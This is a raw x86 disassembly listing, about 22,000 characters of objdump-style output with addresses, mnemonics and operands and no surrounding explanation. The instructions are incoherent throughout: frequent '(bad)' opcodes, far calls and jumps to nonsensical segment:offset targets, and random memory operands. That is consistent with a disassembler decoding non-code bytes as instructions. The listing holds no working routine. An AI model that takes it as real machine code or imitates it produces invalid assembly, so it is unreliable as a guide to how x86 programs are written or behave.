  41cb87:	inc    DWORD PTR [esi]
  41cb89:	inc    DWORD PTR [ebx+0x339c79]
  41cb8f:	int3   
  41cb90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb91:	or     DWORD PTR [ecx+0x74d5df],0xffffffff
  41cb98:	mov    ds:0xc33e0000,eax
  41cb9d:	mov    ecx,0xfff3ff83
  41cba2:	mov    DWORD PTR [esi-0xc],ecx
  41cba5:	pop    ecx
  41cba6:	mov    edi,edi
  41cba8:	aad    0x0
  41cbaa:	xor    DWORD PTR [edi],0x7c
  41cbad:	in     al,dx
  41cbae:	add    ah,cl
  41cbb0:	adc    al,0x0
  41cbb2:	int3   
  41cbb3:	shr    DWORD PTR [ebx],1
  41cbb5:	repz (bad) 
  41cbb7:	call   DWORD PTR [ebx-0x65b10001]
  41cbbd:	test   bh,bh
  41cbbf:	mov    DWORD PTR [esi+0x7a0bff89],edi
  41cbc5:	loope  0x41cbc6
  41cbc7:	push   DWORD PTR [ecx-0x747b7c34]
  41cbcd:	inc    edi
  41cbce:	cmp    edi,0xfffffffc
  41cbd1:	(bad)  
  41cbd2:	inc    edi
  41cbd4:	mov    bl,BYTE PTR [edx-0x410100]
  41cbda:	add    BYTE PTR [eax],dl
  41cbdc:	test   al,0x54
  41cbde:	inc    DWORD PTR [eax]
  41cbe0:	or     DWORD PTR [eax],eax
  41cbe2:	dec    DWORD PTR ds:0xffff739f
  41cbe8:	mov    ecx,0x17d89ff
  41cbed:	mov    eax,ds:0xff630083
  41cbf2:	call   DWORD PTR [ebx-0x7c8f0b]
  41cbf8:	pop    es
  41cbf9:	add    DWORD PTR [ebx-0xd8ec1d],0xffffffcc
  41cc00:	mov    ds:0xcd1a00ff,eax
  41cc05:	inc    esi
  41cc06:	inc    DWORD PTR [eax]
  41cc08:	(bad)  
  41cc0a:	call   FWORD PTR [eax-0x7c2327]
  41cc10:	mov    bh,0x0
  41cc12:	jmp    FWORD PTR [ebx-0xcba1]
  41cc18:	mov    esi,0x17e000ff
  41cc1d:	std    
  41cc1e:	dec    esp
  41cc20:	(bad)  
  41cc23:	xor    BYTE PTR [ebp+eax*8-0x1],dl
  41cc27:	cmp    DWORD PTR [edx+0x0],0xffffffff
  41cc2b:	xchg   DWORD PTR [eax-0x69],edi
  41cc2e:	(bad)  
  41cc2f:	inc    DWORD PTR [esi-0x77]
  41cc32:	add    bh,dh
  41cc34:	cmp    BYTE PTR [ecx],ch
  41cc36:	inc    DWORD PTR [eax]
  41cc38:	pop    esi
  41cc39:	(bad)  
  41cc3a:	jmp    FWORD PTR [ecx]
  41cc3c:	sub    eax,0x600fffc
  41cc41:	inc    DWORD PTR [eax]
  41cc43:	call   0xff84:0xffff37a5
  41cc4a:	xor    DWORD PTR [ecx-0x372f],0xffffffad
  41cc51:	add    BYTE PTR [eax],al
  41cc53:	xchg   edx,eax
  41cc54:	cmp    ebp,edi
  41cc56:	(bad)  
  41cc57:	call   DWORD PTR [ebx]
  41cc59:	add    BYTE PTR [eax],al
  41cc5b:	dec    ebp
  41cc5c:	call   0xffff:0x2b0000e4
  41cc63:	or     eax,0x8300ee21
  41cc68:	mov    al,0x89
  41cc6a:	dec    DWORD PTR [edx-0xea89]
  41cc70:	pop    ebp
  41cc71:	add    ah,cl
  41cc73:	das    
  41cc74:	xor    eax,0xf2ffff99
  41cc79:	inc    DWORD PTR [eax]
  41cc7b:	push   0xffffffc6
  41cc7d:	dec    ecx
  41cc7e:	inc    DWORD PTR [eax]
  41cc80:	or     edi,edi
  41cc82:	int3   
  41cc83:	mov    DWORD PTR [ebx],eax
  41cc85:	sub    eax,0xffe08300
  41cc8a:	(bad)  
  41cc8b:	out    dx,al
  41cc8c:	sti    
  41cc8d:	dec    ecx
  41cc8e:	add    bh,bh
  41cc90:	fdivp  st(7),st
  41cc92:	int3   
  41cc93:	addr16 in al,dx
  41cc95:	sbb    edi,edi
  41cc97:	dec    edi
  41cc99:	(bad)  
  41cc9a:	dec    ecx
  41cc9c:	cdq    
  41cc9d:	pusha  
  41cc9e:	inc    DWORD PTR [eax]
  41cca0:	mov    eax,ds:0xca19ffff
  41cca5:	gs cmp edi,0xffffffe0
  41cca9:	mov    edi,edi
  41ccab:	add    al,0x7
  41ccad:	pop    edi
  41ccae:	add    DWORD PTR [ebx-0x58ff00fa],0x33
  41ccb5:	pop    edi
  41ccb6:	add    BYTE PTR [eax],al
  41ccb8:	(bad)  
  41ccb9:	(bad)  
  41ccba:	jmp    DWORD PTR [edi-0x3376c7d5]
  41ccc0:	jno    0x41ccc1
  41ccc2:	inc    ebp
  41ccc4:	sub    al,0xc9
  41ccc6:	(bad)  
  41ccc7:	dec    DWORD PTR [eax+eax*1-0x1fc7ba34]
  41ccce:	(bad)  
  41cccf:	call   DWORD PTR [ebx+0x0]
  41ccd2:	dec    DWORD PTR ds:0xff89a431
  41ccd8:	inc    edi
  41ccd9:	(bad)  
  41ccda:	jmp    DWORD PTR [ecx-0x7c7cc9]
  41cce0:	ins    DWORD PTR es:[edi],dx
  41cce1:	mov    DWORD PTR [eax],eax
  41cce3:	sbb    cl,BYTE PTR [edi+0x3e8383ba]
  41cce9:	(bad)  
  41ccea:	jmp    FWORD PTR [eax]
  41ccec:	jbe    0x41cca7
  41ccee:	mov    edi,edi
  41ccf0:	out    dx,eax
  41ccf1:	add    BYTE PTR [eax],al
  41ccf3:	call   0x839c:0xff26f3
  41ccfa:	inc    DWORD PTR [eax-0x2]
  41ccfd:	mov    edi,?
  41ccff:	add    BYTE PTR [esi+0x0],cl
  41cd02:	call   DWORD PTR [edi+0x76]
  41cd05:	ret    0xff
  41cd08:	inc    esi
  41cd09:	or     DWORD PTR [ecx+0x5e817b],0x0
  41cd10:	fmul   st(4),st
  41cd12:	call   DWORD PTR [esi]
  41cd14:	or     dh,ch
  41cd16:	inc    DWORD PTR [eax]
  41cd18:	fld    QWORD PTR [eax]
  41cd1a:	cmp    DWORD PTR [ecx],0x21
  41cd1d:	cmp    al,0x83
  41cd1f:	call   DWORD PTR [edx]
  41cd21:	(bad)  
  41cd22:	inc    DWORD PTR [ebp+0x61]
  41cd25:	retf   
  41cd26:	inc    DWORD PTR [ebx-0x380000c1]
  41cd2c:	jmp    0xff:0x9ecc0031
  41cd33:	xchg   DWORD PTR [edx-0x4d],eax
  41cd36:	(bad)  
  41cd37:	(bad)  
  41cd38:	fdivr  st,st(7)
  41cd3a:	add    BYTE PTR ds:0x272d,cl
  41cd40:	imul   eax,DWORD PTR [eax],0x5c41cbff
  41cd46:	add    bh,bh
  41cd48:	mov    WORD PTR [ecx-0xe6edf01],cs
  41cd4e:	inc    DWORD PTR [eax]
  41cd50:	(bad)  
  41cd51:	inc    DWORD PTR [eax]
  41cd53:	dec    edi
  41cd54:	mov    eax,0xd8cc83b8
  41cd59:	(bad)  
  41cd5a:	jmp    FWORD PTR [esi+0x43]
  41cd5d:	sub    edi,edi
  41cd5f:	jmp    DWORD PTR [ebx]
  41cd61:	(bad)  
  41cd62:	dec    esp
  41cd64:	jno    0x41cd5f
  41cd66:	inc    DWORD PTR [eax]
  41cd68:	aad    0xff
  41cd6a:	call   FWORD PTR [eax-0x76d14c]
  41cd70:	mov    BYTE PTR [ebx-0x4c311434],al
  41cd76:	dec    DWORD PTR [ecx+0x2f008346]
  41cd7c:	pop    esi
  41cd7d:	add    ecx,esp
  41cd7f:	cmp    DWORD PTR [ebx],0xffffffff
  41cd82:	adc    DWORD PTR ds:0xffcfd1,0xffffff99
  41cd89:	inc    DWORD PTR [ebx-0xf40bd1]
  41cd8f:	int3   
  41cd90:	es add bh,bh
  41cd93:	ds sbb eax,0x4dffcc90
  41cd99:	inc    DWORD PTR [eax]
  41cd9b:	cmp    al,0xcf
  41cd9d:	push   ds
  41cd9e:	(bad)  
  41cd9f:	jmp    FWORD PTR [ecx-0x3a6d3301]
  41cda5:	and    ah,cl
  41cda7:	dec    DWORD PTR [edi]
  41cda9:	int3   
  41cdaa:	call   FWORD PTR [edx-0x7cbd8c]
  41cdb0:	icebp  
  41cdb1:	add    BYTE PTR [ecx-0x27f49b],cl
  41cdb7:	add    BYTE PTR [ecx],ah
  41cdb9:	(bad)  
  41cdba:	inc    DWORD PTR [esp+edx*2-0x1a]
  41cdbe:	inc    DWORD PTR [eax]
  41cdc0:	dec    esp
  41cdc1:	inc    DWORD PTR [eax]
  41cdc3:	ins    BYTE PTR es:[edi],dx
  41cdc4:	xchg   ecx,eax
  41cdc5:	ja     0x41cd4a
  41cdc7:	add    BYTE PTR [esi-0x77],ah
  41cdca:	push   ebp
  41cdcc:	stc    
  41cdcd:	mov    dl,0x83
  41cdcf:	(bad)  
  41cdd0:	cli    
  41cdd1:	mov    edi,edi
  41cdd3:	add    BYTE PTR [eax-0x3b],0xff
  41cdd7:	inc    DWORD PTR [esi-0x1]
  41cdda:	add    BYTE PTR [esi],cl
  41cddc:	leave  
  41cddd:	pop    es
  41cdde:	mov    esp,ecx
  41cde0:	fadd   QWORD PTR [eax]
  41cde2:	add    BYTE PTR [eax],cl
  41cde4:	fisubr WORD PTR [ecx]
  41cde6:	inc    DWORD PTR [ebx-0x5f00ffaa]
  41cdec:	sub    bh,ch
  41cdee:	int3   
  41cdef:	add    BYTE PTR [edi+0x63038383],ch
  41cdf5:	out    dx,eax
  41cdf6:	(bad)  
  41cdf7:	call   FWORD PTR ds:0xaaec00ff
  41cdfd:	aas    
  41cdfe:	inc    DWORD PTR [eax]
  41ce00:	loop   0x41ce02
  41ce02:	sbb    esi,0x9
  41ce05:	mov    ds:0xff350000,eax
  41ce0a:	or     DWORD PTR [edx-0xff7c91],0x2a
  41ce11:	add    BYTE PTR [eax],al
  41ce13:	xchg   ebx,eax
  41ce14:	or     DWORD PTR [edx+0x8383ff],edx
  41ce1a:	int3   
  41ce1b:	add    DWORD PTR [ecx+0x2b],eax
  41ce1e:	(bad)  
  41ce1f:	inc    DWORD PTR [edi-0x77]
  41ce22:	(bad)  
  41ce23:	jp     0x41cdbf
  41ce25:	jmp    0x41ce26
  41ce27:	dec    DWORD PTR [ebx-0x7d]
  41ce2a:	add    al,bh
  41ce2c:	xor    ecx,DWORD PTR [ecx]
  41ce2e:	int3   
  41ce2f:	dec    DWORD PTR [ecx]
  41ce31:	cmp    edi,0x4f
  41ce34:	and    dl,ch
  41ce36:	(bad)  
  41ce37:	(bad)  
  41ce38:	mov    esi,0x20c100cc
  41ce3d:	rol    DWORD PTR [eax],0xff
  41ce40:	mov    edi,edi
  41ce42:	or     DWORD PTR [ebp+0x7d],0xffffffd9
  41ce46:	inc    DWORD PTR [ebx+0x3f83ff86]
  41ce4c:	add    DWORD PTR [ebp-0x8e0001],edx
  41ce52:	add    BYTE PTR [edx-0x57],ch
  41ce55:	sub    edi,edi
  41ce57:	mov    DWORD PTR [eax-0x721f7601],ebp
  41ce5d:	fild   DWORD PTR [eax]
  41ce5f:	xor    DWORD PTR [edi+edi*8],0xffffffff
  41ce63:	cmp    eax,0xff004732
  41ce68:	push   0xffffffff
  41ce6a:	xor    DWORD PTR [ebp-0x19],0x75
  41ce6e:	add    bh,bh
  41ce70:	xchg   esp,eax
  41ce71:	int3   
  41ce72:	int3   
  41ce73:	sbb    eax,0xffff7c10
  41ce78:	aaa    
  41ce79:	inc    DWORD PTR [eax]
  41ce7b:	add    ah,BYTE PTR [ecx]
  41ce7d:	adc    edi,edi
  41ce7f:	add    BYTE PTR [edi+edi*8-0x4f01f401],ah
  41ce86:	dec    esp
  41ce88:	adc    al,0xff
  41ce8a:	push   DWORD PTR [edx+0x64]
  41ce8d:	out    0xff,al
  41ce8f:	dec    DWORD PTR [edi]
  41ce91:	(bad)  
  41ce92:	inc    DWORD PTR [edi-0xff409b]
  41ce98:	mov    ebx,0x26798383
  41ce9d:	ss (bad) 
  41ce9f:	push   DWORD PTR [ecx-0x1]
  41cea2:	dec    DWORD PTR [esi+0x39]
  41cea5:	inc    DWORD PTR ds:[eax]
  41cea8:	(bad)  
  41ceaa:	add    BYTE PTR ds:0xffff2612,dh
  41ceb0:	or     DWORD PTR ds:[ecx-0x4919de],0x0
  41ceb8:	mov    ecx,0xdb5800ff
  41cebd:	fld    DWORD PTR [eax]
  41cebf:	add    BYTE PTR [edi+edi*8+0x0],dh
  41cec3:	clc    
  41cec4:	rol    DWORD PTR [ecx],cl
  41cec6:	add    bh,bh
  41cec8:	pop    es
  41cec9:	add    BYTE PTR [ebx-0xcc3801],al
  41cecf:	dec    DWORD PTR [ebx-0x77]
  41ced2:	jmp    FWORD PTR [ecx+0x45]
  41ced5:	adc    al,0xff
  41ced7:	add    BYTE PTR [ecx-0x1],al
  41ceda:	dec    DWORD PTR [ebx]
  41cedc:	mov    eax,0x21cc0014
  41cee1:	int3   
  41cee2:	mov    DWORD PTR [ebp+edx*4+0x2c],ebp
  41cee6:	inc    DWORD PTR [eax]
  41cee8:	xor    al,0x0
  41ceea:	add    cl,ah
  41ceec:	or     eax,0x283ff30
  41cef1:	mov    edi,edi
  41cef3:	pop    ebx
  41cef4:	inc    esp
  41cef5:	mov    eax,ds:0xff00ff
  41cefa:	add    DWORD PTR [eax+0x83e846],0xffffffce
  41cf01:	inc    DWORD PTR [ebx-0xf9c5dc]
  41cf07:	add    BYTE PTR [esi+0x0],bh
  41cf0a:	dec    DWORD PTR [eax]
  41cf0c:	pop    esi
  41cf0d:	fld    QWORD PTR [eax]
  41cf0f:	dec    ebp
  41cf11:	(bad)  
  41cf12:	(bad)  
  41cf13:	jg     0x41cf76
  41cf15:	push   ebx
  41cf16:	dec    DWORD PTR [ecx-0x33333334]
  41cf1c:	int3   
  41cf1d:	int3   
  41cf1e:	int3   
  41cf1f:	int3   
  41cf20:	stc    
  41cf21:	adc    eax,DWORD PTR [eax]
  41cf23:	int3   
  41cf24:	clc    
  41cf25:	add    bh,bh
  41cf27:	aad    0xff
  41cf29:	or     al,0x3b
  41cf2b:	add    BYTE PTR [edi-0x7d],ah
  41cf2e:	push   esi
  41cf2f:	and    DWORD PTR [esi+0x52ff8304],0xffffffcc
  41cf36:	add    BYTE PTR [eax+0xfc3a89],al
  41cf3c:	ds (bad) 
  41cf3e:	aas    
  41cf3f:	add    BYTE PTR [eax+0x3189ccc9],bl
  41cf45:	dec    DWORD PTR [ecx-0x2ea7c69]
  41cf4b:	(bad)  
  41cf4c:	jp     0x41cf4e
  41cf4e:	cmp    eax,0xc130ff
  41cf53:	dec    DWORD PTR [ebx]
  41cf55:	add    BYTE PTR [eax],al
  41cf57:	xor    eax,DWORD PTR [ebx+0x59ccba95]
  41cf5d:	int3   
  41cf5e:	fwait
  41cf5f:	add    bh,dh
  41cf61:	mov    ah,0xcc
  41cf63:	add    bh,dh
  41cf65:	add    bh,bh
  41cf67:	xchg   ebp,eax
  41cf68:	add    BYTE PTR [esi+0x470091],bh
  41cf6e:	xor    eax,0xff2e9acc
  41cf73:	add    BYTE PTR [ebx-0xe9ff01],dh
  41cf79:	cs sahf 
  41cf7b:	add    BYTE PTR [ebp-0x28002a34],cl
  41cf81:	mov    dh,0x0
  41cf83:	sub    ebx,0xffffff83
  41cf86:	jmp    DWORD PTR [eax-0x34]
  41cf89:	or     DWORD PTR [edx-0x1],0xff36ff06
  41cf90:	aaa    
  41cf91:	mov    dl,0x83
  41cf93:	xor    eax,0xffffff83
  41cf96:	add    BYTE PTR [ebp-0x1],dh
  41cf99:	repz jno 0x41cf9b
  41cf9c:	lods   eax,DWORD PTR ds:[esi]
  41cf9d:	and    DWORD PTR [esi-0x7c63ac7d],0xffffff83
  41cfa4:	cmc    
  41cfa5:	add    BYTE PTR [eax],al
  41cfa7:	cwde   
  41cfa8:	call   DWORD PTR [ecx+ebp*4]
  41cfab:	add    ebp,0x0
  41cfae:	test   eax,0xffec09ff
  41cfb3:	cmp    DWORD PTR [eax+0x96ff00],0x3
  41cfba:	push   DWORD PTR gs:[edi-0x34]
  41cfbe:	(bad)  
  41cfbf:	jmp    FWORD PTR [ebp-0x157c0002]
  41cfc5:	add    bh,bh
  41cfc7:	hlt    
  41cfc8:	sub    DWORD PTR [ecx+esi*4-0x7301],0xffffffff
  41cfd0:	bound  edx,QWORD PTR [edi]
  41cfd2:	add    bh,bh
  41cfd4:	add    eax,0xff09ffff
  41cfd9:	je     0x41d02c
  41cfdb:	call   FWORD PTR [ecx-0x737cf701]
  41cfe1:	pop    es
  41cfe2:	int3   
  41cfe3:	int3   
  41cfe4:	lahf   
  41cfe5:	(bad)  
  41cfe6:	(bad)  
  41cfe7:	(bad)  
  41cfe9:	jae    0x41d052
  41cfeb:	or     edx,0xffffff83
  41cfee:	and    al,0xff
  41cff0:	sahf   
  41cff1:	mov    eax,0xff2483cc
  41cff6:	and    eax,0x0
  41cff9:	test   edx,edx
  41cffb:	int3   
  41cffc:	cmp    eax,0xe1003500
  41d001:	xor    al,0x0
  41d003:	jmp    DWORD PTR [edx-0x77]
  41d006:	sbb    DWORD PTR [ebp-0x34],0x38
  41d00a:	dec    esi
  41d00b:	add    BYTE PTR [ebx-0x1],al
  41d00e:	sar    edi,1
  41d010:	and    BYTE PTR [ecx+ecx*4+0x0],ch
  41d014:	push   cs
  41d015:	cmp    edi,0x4d
  41d018:	dec    DWORD PTR [ebx-0x7cb10058]
  41d01e:	adc    ecx,esp
  41d020:	and    BYTE PTR [edi+edi*8],dl
  41d023:	mov    DWORD PTR ds:0xffd9ffff,edi
  41d029:	cmp    eax,0x77cc45
  41d02e:	out    0xff,eax
  41d030:	leave  
  41d031:	enter  0xffff,0x19
  41d035:	cmp    edi,0xffffff99
  41d038:	xor    DWORD PTR [eax+0xd883b2],0x59
  41d03f:	(bad)  
  41d040:	jmp    0x41d021
  41d042:	mov    DWORD PTR [eax],eax
  41d044:	mov    cl,0x83
  41d046:	add    BYTE PTR [ebp+0x0],dh
  41d049:	rcr    BYTE PTR [edi],cl
  41d04b:	add    BYTE PTR [edx],bl
  41d04d:	add    dl,dh
  41d04f:	call   DWORD PTR [edi]
  41d051:	(bad)  
  41d052:	(bad)  
  41d053:	jmp    edi
  41d055:	dec    DWORD PTR [ecx+0x6d80008f]
  41d05b:	sub    esp,0xffffff89
  41d05e:	ja     0x41d05f
  41d060:	icebp  
  41d061:	test   edi,edi
  41d063:	inc    DWORD PTR [esi-0x49ff01]
  41d069:	mov    esi,0xffb383af
  41d06e:	popf   
  41d06f:	add    BYTE PTR [edx],cl
  41d071:	stos   DWORD PTR es:[edi],eax
  41d072:	inc    DWORD PTR [ebx+0x11ffcc0f]
  41d078:	jmp    DWORD PTR [ebx]
  41d07a:	push   0x0
  41d07c:	bound  eax,QWORD PTR [ebx+0x59b1ff83]
  41d082:	inc    DWORD PTR [eax]
  41d084:	mov    ebp,0xf6ff00
  41d089:	add    eax,0xff6a837e
  41d08e:	leave  
  41d08f:	add    BYTE PTR [edi+0x39ff8940],dl
  41d095:	dec    DWORD PTR [ecx-0x775dff21]
  41d09b:	add    BYTE PTR [ecx+0x32fff700],ah
  41d0a1:	jge    0x41d026
  41d0a3:	(bad)  
  41d0a4:	jp     0x41d0a6
  41d0a6:	call   edx
  41d0a8:	inc    DWORD PTR [esi-0x1a7cb9]
  41d0ae:	scas   al,BYTE PTR es:[edi]
  41d0af:	jmp    DWORD PTR [edi+0x47]
  41d0b2:	cmp    edi,0xffffffb6
  41d0b5:	(bad)  
  41d0b6:	jmp    FWORD PTR [edx-0x58e301]
  41d0bc:	rol    BYTE PTR [eax],cl
  41d0be:	call   0xbac546
  41d0c3:	call   esp
  41d0c5:	or     DWORD PTR [ecx+0x4149cc3d],0xffffffff
  41d0cc:	ret    0xd100
  41d0cf:	push   DWORD PTR [esi-0x19]
  41d0d2:	inc    DWORD PTR [eax]
  41d0d4:	ret    
  41d0d5:	inc    DWORD PTR [eax]
  41d0d7:	sbb    eax,0x83ae09ff
  41d0dc:	ins    BYTE PTR es:[edi],dx
  41d0dd:	(bad)  
  41d0de:	ds add bh,bl
  41d0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e2:	or     DWORD PTR [ecx+0x5b00ff90],0xffffffcc
  41d0e9:	scas   eax,DWORD PTR es:[edi]
  41d0ea:	hlt    
  41d0eb:	add    BYTE PTR [ecx+0x0],dh
  41d0ee:	push   ebx
  41d0ef:	jmp    FWORD PTR [esi+0x62]
  41d0f2:	mov    DWORD PTR [eax],eax
  41d0f4:	xchg   ebx,eax
  41d0f5:	int3   
  41d0f6:	add    al,ch
  41d0f8:	sbb    esp,0x2c
  41d0fb:	call   FWORD PTR [ecx]
  41d0fd:	jmp    DWORD PTR [edi-0x77]
  41d100:	xchg   ebx,eax
  41d101:	or     eax,DWORD PTR [eax]
  41d103:	add    BYTE PTR [ecx],cl
  41d105:	add    bh,bh
  41d107:	and    edi,edi
  41d109:	sbb    DWORD PTR [edx-0x1],esi
  41d10c:	(bad)  
  41d10d:	push   DWORD PTR [edx]
  41d10f:	add    bl,ch
  41d111:	inc    DWORD PTR es:[ebx+0x3ffff8c]
  41d118:	jmp    DWORD PTR [esi+0x45]
  41d11b:	(bad)  
  41d11c:	jp     0x41d11e
  41d11e:	and    esp,ecx
  41d120:	and    BYTE PTR [edi-0x1],bl
  41d123:	add    dl,dh
  41d125:	cmp    edi,0xf
  41d128:	sub    DWORD PTR [eax],0x5e
  41d12b:	push   eax
  41d12d:	mov    DWORD PTR [edi-0xd8d934],ebx
  41d133:	call   DWORD PTR [eax-0x7d]
  41d136:	cmp    DWORD PTR [ebx-0xcdc801],0x57
  41d13d:	jmp    FWORD PTR [ebp-0x1]
  41d140:	out    0x47,eax
  41d142:	add    DWORD PTR [ebx+0x60ff0014],0xffffffff
  41d149:	inc    ebx
  41d14a:	xchg   ecx,eax
  41d14b:	(bad)  
  41d14c:	cmp    edi,edi
  41d14e:	sahf   
  41d14f:	adc    DWORD PTR [ebp+0x26],0xffffff89
  41d153:	push   DWORD PTR [esi-0x7d]
  41d156:	int3   
  41d157:	sub    al,0x0
  41d159:	ret    0x8381
  41d15c:	out    0x0,eax
  41d15e:	pop    ss
  41d15f:	(bad)  
  41d160:	jl     0x41d157
  41d162:	add    BYTE PTR [ebx-0x2dffff7c],al
  41d168:	jmp    FWORD PTR [ebx-0x7c5c3366]
  41d16e:	retf   
  41d16f:	call   FWORD PTR [edx]
  41d171:	jge    0x41d172
  41d173:	mov    DWORD PTR [ecx+0x0],esp
  41d176:	add    dh,dl
  41d178:	add    BYTE PTR [edi],dh
  41d17a:	add    DWORD PTR [eax],0x18
  41d17d:	add    BYTE PTR [eax+eax*1],bh
  41d180:	xchg   esi,eax
  41d181:	inc    ebx
  41d182:	int3   
  41d183:	sbb    DWORD PTR [ebx-0x1],0x0
  41d187:	fild   WORD PTR [eax]
  41d189:	mov    ebx,0x8939ccba
  41d18e:	sub    WORD PTR [ebp+0x690000ac],0x0
  41d196:	add    BYTE PTR [ebx-0x1],bh
  41d199:	call   0xff7a:0xffd8ff52
  41d1a0:	in     eax,dx
  41d1a1:	sub    al,BYTE PTR [eax]
  41d1a3:	add    BYTE PTR [eax+eax*1],dh
  41d1a6:	(bad)  
  41d1a7:	mov    ebp,0xffca3800
  41d1ac:	stc    
  41d1ad:	add    BYTE PTR [ebp-0x1e001],bh
  41d1b3:	add    ch,al
  41d1b5:	(bad)  
  41d1b6:	jmp    ebp
  41d1b8:	add    dh,al
  41d1ba:	bound  eax,QWORD PTR [ebx+0xd80033]
  41d1c0:	sub    dh,ah
  41d1c2:	add    bh,bh
  41d1c4:	test   al,0x89
  41d1c6:	add    BYTE PTR ds:0xffaf5589,dh
  41d1cc:	pusha  
  41d1cd:	sub    DWORD PTR [edx],0xffffffff
  41d1d0:	call   0xff83:0x7183cc92
  41d1d7:	add    al,0xff
  41d1d9:	inc    esp
  41d1da:	arpl   di,di
  41d1dc:	in     al,dx
  41d1dd:	mov    DWORD PTR [esi-0x1],edi
  41d1e0:	sbb    dl,ah
  41d1e2:	add    bh,bh
  41d1e4:	into   
  41d1e5:	inc    DWORD PTR [ebx+0x17e1892d]
  41d1eb:	dec    DWORD PTR [eax-0x1]
  41d1ee:	outs   dx,DWORD PTR ds:[esi]
  41d1ef:	int3   
  41d1f0:	lock sahf 
  41d1f2:	inc    DWORD PTR [eax]
  41d1f4:	add    eax,0xff9bcc00
  41d1f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1fa:	dec    esi
  41d1fb:	jmp    DWORD PTR [ecx]
  41d1fd:	(bad)  
  41d1fe:	cmp    al,0xff
  41d200:	sub    eax,0x9bffffc2
  41d205:	dec    DWORD PTR [ecx+0x77fb8367]
  41d20b:	and    DWORD PTR [esi-0x2006234],0x2
  41d212:	add    bh,bh
  41d214:	lahf   
  41d215:	dec    DWORD PTR [ecx-0x4f947c31]
  41d21b:	int3   
  41d21c:	push   0x430017ff
  41d221:	push   ebx
  41d222:	add    bh,bh
  41d224:	dec    esi
  41d225:	(bad)  
  41d226:	jmp    FWORD PTR [edi]
  41d228:	call   DWORD PTR [esi+ebx*1-0x74ff777d]
  41d22f:	and    DWORD PTR [ebp+0x1affff51],0x0
  41d236:	push   DWORD PTR [ebx+0x25cdff]
  41d23c:	mov    al,0xcc
  41d23e:	call   0xf600:0xffc157ff
  41d245:	dec    DWORD PTR [ecx-0x7efdff87]
  41d24b:	add    BYTE PTR [ebx],ah
  41d24d:	(bad)  
  41d24e:	ds (bad) 
  41d250:	mov    edi,0x7effffdb
  41d255:	cmp    edi,0xffffffaf
  41d258:	adc    DWORD PTR [ebx-0x79],0x0
  41d25c:	push   0xffffffff
  41d25e:	mov    ecx,0x6a283
  41d263:	dec    ebp
  41d265:	add    BYTE PTR [eax],al
  41d267:	jge    0x41d268
  41d269:	dec    ebp
  41d26a:	(bad)  
  41d26c:	call   0xccad:0x9d834fff
  41d273:	sub    DWORD PTR [ecx],0xffffffff
  41d276:	and    DWORD PTR [edx-0x3337bb00],0x69
  41d27d:	mov    DWORD PTR [esi+0xa87600],ebp
  41d283:	push   esp
  41d285:	dec    esp
  41d287:	adc    cl,BYTE PTR [ecx-0xb402]
  41d28d:	dec    DWORD PTR [edi-0x34]
  41d290:	into   
  41d291:	rol    BYTE PTR [ebx-0x33003077],1
  41d297:	inc    esp
  41d298:	int3   
  41d299:	scas   eax,DWORD PTR es:[edi]
  41d29a:	icebp  
  41d29b:	add    BYTE PTR [esi-0x5aff1801],bl
  41d2a1:	lods   eax,DWORD PTR ds:[esi]
  41d2a2:	add    DWORD PTR [eax],0xffffff90
  41d2a5:	add    bh,bh
  41d2a7:	(bad)  
  41d2a9:	xlat   BYTE PTR ds:[ebx]
  41d2aa:	inc    ebx
  41d2ab:	add    BYTE PTR [ebp-0x22007d77],ah
  41d2b1:	dec    edi
  41d2b2:	add    bh,bh
  41d2b4:	cmp    eax,DWORD PTR [eax]
  41d2b6:	push   DWORD PTR [eax+0x0]
  41d2b9:	dec    edx
  41d2ba:	mov    edx,0xfeff76ff
  41d2bf:	inc    DWORD PTR [edx-0x7a]
  41d2c2:	inc    DWORD PTR [eax]
  41d2c4:	(bad)  
  41d2c5:	inc    DWORD PTR [eax]
  41d2c7:	(bad)  
  41d2c8:	dec    DWORD PTR [eax]
  41d2ca:	stos   DWORD PTR es:[edi],eax
  41d2cb:	add    BYTE PTR [ebx+eax*4-0x7d],dl
  41d2cf:	inc    DWORD PTR [eax+0x36]
  41d2d2:	inc    DWORD PTR [ebx+0x458383ae]
  41d2d8:	push   DWORD PTR ds:0xccccb3
  41d2de:	stos   DWORD PTR es:[edi],eax
  41d2df:	add    BYTE PTR [esi-0x7e7c0095],bh
  41d2e5:	(bad)  
  41d2e6:	inc    DWORD PTR [eax+0x0]
  41d2e9:	push   ecx
  41d2ea:	int3   
  41d2eb:	add    BYTE PTR [ecx],al
  41d2ed:	add    BYTE PTR [ecx-0x1],bl
  41d2f0:	xchg   ebx,eax
  41d2f1:	add    al,0xff
  41d2f3:	mov    esi,edx
  41d2f5:	(bad)  
  41d2f6:	push   DWORD PTR [ecx]
  41d2f8:	call   DWORD PTR [edx]
  41d2fa:	push   ss
  41d2fb:	add    BYTE PTR [eax+eax*1-0x5d2a0059],bl
  41d302:	add    BYTE PTR [eax],al
  41d304:	into   
  41d305:	dec    esp
  41d307:	(bad)  
  41d309:	mov    BYTE PTR [eax-0x1],ah
  41d30c:	xchg   edi,eax
  41d30d:	call   ecx
  41d30f:	call   esp
  41d311:	dec    edx
  41d312:	inc    DWORD PTR [eax]
  41d314:	inc    ecx
  41d315:	or     DWORD PTR [ecx-0x7245ffc5],0xffffffff
  41d31c:	mov    al,ds:0xf200aeff
  41d321:	arpl   sp,cx
  41d323:	add    BYTE PTR [ebx-0x77],ah
  41d326:	add    BYTE PTR [ecx+0x289689],dl
  41d32c:	ret    
  41d32d:	int3   
  41d32e:	xchg   edi,edi
  41d330:	fld    QWORD PTR fs:[eax]
  41d333:	call   ecx
  41d335:	dec    DWORD PTR [ecx+0x90dff2a]
  41d33b:	dec    DWORD PTR [edx]
  41d33d:	jmp    DWORD PTR [edi+0xc12a89]
  41d343:	call   FWORD PTR [edx]
  41d345:	dec    esp
  41d347:	or     DWORD PTR [bx],0xffffffb0
  41d34b:	add    BYTE PTR [ebp+0x0],bl
  41d34e:	pusha  
  41d34f:	add    BYTE PTR [ecx-0x78000055],bh
  41d355:	inc    DWORD PTR [ebx-0x7835003c]
  41d35b:	(bad)  
  41d35c:	(bad)  
  41d35d:	push   DWORD PTR [eax+eax*1]
  41d360:	xchg   ecx,eax
  41d361:	jmp    0xa600:0xff58ff89
  41d368:	call   FWORD PTR [ebx-0xe000da]
  41d36e:	leave  
  41d36f:	call   FWORD PTR [ebx+0x43]
  41d372:	add    ah,cl
